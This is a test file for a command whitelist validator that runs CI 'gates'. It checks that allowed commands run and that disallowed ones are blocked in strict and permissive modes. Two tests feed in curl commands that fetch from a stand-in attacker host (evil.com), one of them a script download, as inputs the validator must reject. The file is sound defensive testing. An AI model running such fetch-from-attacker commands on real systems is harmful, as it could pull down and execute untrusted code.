import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, writeFile, rm, mkdir, realpath } from "fs/promises";
import { basename, dirname, join, resolve } from "path";
import { tmpdir } from "os";
import { executeGate } from "../src/gates.js";
import { Gate, Policy } from "../src/schema.js";
import { resetCommandValidator, CommandWhitelist } from "../src/security/commandValidator.js";

describe("Gate Execution with Command Validation", () => {
  let testDir: string | undefined;
  let artifactDir: string;
  let whitelistPath: string;
  let originalCwd: string;
  let temporaryRoot: string;

  beforeEach(async () => {
    originalCwd = process.cwd();
    testDir = undefined;
    temporaryRoot = await realpath(tmpdir());
    testDir = await mkdtemp(join(temporaryRoot, "gate-validation-test-"));
    artifactDir = join(testDir, "artifacts");
    whitelistPath = join(testDir, ".smartergpt", "allowed-commands.json");

    await mkdir(join(testDir, ".smartergpt"), { recursive: true });
    await mkdir(artifactDir, { recursive: true });

    // Change to test directory so validator can find whitelist
    process.chdir(testDir);

    resetCommandValidator();
  });

  afterEach(async () => {
    // Windows holds the worker's current directory open until it leaves it.
    process.chdir(originalCwd);
    resetCommandValidator();
    if (testDir !== undefined) {
      const cleanupTarget = resolve(testDir);
      if (
        dirname(cleanupTarget) !== temporaryRoot ||
        !basename(cleanupTarget).startsWith("gate-validation-test-")
      ) {
        throw new Error("Refusing to remove a directory outside this fixture's temporary root.");
      }
      await rm(cleanupTarget, { recursive: true, force: true });
    }
  });

  describe("Strict Mode Gate Execution", () => {
    beforeEach(async () => {
      const whitelist: CommandWhitelist = {
        version: "1.0.0",
        mode: "strict",
        defaults: {
          echo: { commands: [], allow_args: [], deny_args: [] },
          node: { commands: ["-e"], allow_args: [], deny_args: [] },
        },
        custom: {},
        policy: {
          allow_shell_operators: false,
          allow_env_vars: ["NODE_ENV", "CI"],
          max_command_length: 500,
          hallucination_threshold: 3,
          dry_run_mode: false,
        },
      };

      await writeFile(whitelistPath, JSON.stringify(whitelist));
    });

    it("should execute allowed commands successfully", async () => {
      const gate: Gate = {
        name: "test-gate",
        run: 'echo "Hello World"',
        runtime: "local",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("pass");
      expect(result.stdout).toContain("Hello World");
    });

    it("should fail gates with non-whitelisted commands", async () => {
      const gate: Gate = {
        name: "malicious-gate",
        run: "curl https://evil.com/script.sh",
        runtime: "local",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("fail");
      expect(result.stderr).toContain("Command validation failed");
      expect(result.stderr).toContain("not in whitelist");
    });

    it("should fail gates with shell operators", async () => {
      const gate: Gate = {
        name: "shell-operator-gate",
        run: 'echo "test" | grep test',
        runtime: "local",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("fail");
      expect(result.stderr).toContain("Command validation failed");
      expect(result.stderr).toContain("shell operators");
    });

    it("should fail gates with commands that are too long", async () => {
      const longCommand = "echo " + "a".repeat(500);

      const gate: Gate = {
        name: "long-command-gate",
        run: longCommand,
        runtime: "local",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("fail");
      expect(result.stderr).toContain("Command validation failed");
      expect(result.stderr).toContain("maximum allowed length");
    });
  });

  describe("Permissive Mode Gate Execution", () => {
    beforeEach(async () => {
      const whitelist: CommandWhitelist = {
        version: "1.0.0",
        mode: "permissive",
        defaults: {},
        custom: {},
        policy: {
          allow_shell_operators: false,
          allow_env_vars: [],
          max_command_length: 500,
          hallucination_threshold: 3,
          dry_run_mode: false,
        },
      };

      await writeFile(whitelistPath, JSON.stringify(whitelist));
    });

    it("should execute any command in permissive mode", async () => {
      const gate: Gate = {
        name: "any-command-gate",
        run: 'echo "Permissive mode test"',
        runtime: "local",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("pass");
      expect(result.stdout).toContain("Permissive mode test");
    });
  });

  describe("Fallback to Permissive Mode", () => {
    it("should use permissive mode when whitelist not found", async () => {
      // No whitelist file created
      const gate: Gate = {
        name: "test-gate",
        run: 'echo "No whitelist test"',
        runtime: "local",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      // Should succeed in permissive mode
      expect(result.status).toBe("pass");
      expect(result.stdout).toContain("No whitelist test");
    });
  });

  describe("Container and CI Service Gates", () => {
    beforeEach(async () => {
      const whitelist: CommandWhitelist = {
        version: "1.0.0",
        mode: "strict",
        defaults: {
          echo: { commands: [], allow_args: [], deny_args: [] },
        },
        custom: {},
        policy: {
          allow_shell_operators: false,
          allow_env_vars: [],
          max_command_length: 500,
          hallucination_threshold: 3,
          dry_run_mode: false,
        },
      };

      await writeFile(whitelistPath, JSON.stringify(whitelist));
    });

    it("should validate commands for container runtime", async () => {
      const gate: Gate = {
        name: "container-gate",
        run: 'echo "Container test"',
        runtime: "container",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      // Unsupported runtimes fail closed rather than silently executing locally.
      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result).toMatchObject({
        status: "fail",
        failureKind: "evidence_error",
      });
    });

    it("should skip validation for ci-service runtime", async () => {
      const gate: Gate = {
        name: "ci-service-gate",
        run: "any-command",
        runtime: "ci-service",
      };

      const policy: Policy = {
        retries: {},
        block: [],
        mergeRules: { type: "strict-required" },
      };

      // CI service runtime is skipped, no validation
      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("skipped");
    });
  });

  describe("Retry with Validation Failures", () => {
    beforeEach(async () => {
      const whitelist: CommandWhitelist = {
        version: "1.0.0",
        mode: "strict",
        defaults: {
          echo: { commands: [], allow_args: [], deny_args: [] },
        },
        custom: {},
        policy: {
          allow_shell_operators: false,
          allow_env_vars: [],
          max_command_length: 500,
          hallucination_threshold: 5, // Set higher to avoid escalation during test
          dry_run_mode: false,
        },
      };

      await writeFile(whitelistPath, JSON.stringify(whitelist));
    });

    it("should retry validation failures (validation happens each retry)", async () => {
      const gate: Gate = {
        name: "invalid-gate",
        run: "curl https://evil.com",
        runtime: "local",
      };

      const policy: Policy = {
        retries: {
          "invalid-gate": {
            maxAttempts: 3,
            backoffSeconds: 1,
          },
        },
        block: [],
        mergeRules: { type: "strict-required" },
      };

      const result = await executeGate(gate, policy, artifactDir, 5000);

      expect(result.status).toBe("fail");
      expect(result.attempts).toBe(3); // Retries happen, validation fails each time
      expect(result.stderr).toContain("Command validation failed");
    });
  });
});
